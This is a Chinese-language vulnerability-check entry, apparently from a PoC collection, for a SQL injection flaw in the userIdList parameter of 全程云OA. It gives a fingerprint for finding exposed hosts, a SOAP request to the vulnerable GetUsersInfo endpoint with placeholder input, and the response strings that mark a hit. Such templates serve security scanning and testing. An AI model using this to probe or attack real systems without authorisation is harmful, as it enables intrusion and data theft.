﻿# 全程云OA userIdList存在SQL注入漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="images/yipeoplehover.png"

> 验证脚本：HTTP

```
POST /oa/pm/svc.asmx HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetUsersInfo"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUsersInfo xmlns="http://tempuri.org/">
      <userIdList>string</userIdList>
    </GetUsersInfo>
  </soap:Body>
</soap:Envelope>
```

> 响应代码特征：200

> 响应内容特征：GetUsersInfoResponse

> 上传文件定位：


> 验证文件来源：全程云OA userIdList存在SQL注入漏洞.poc
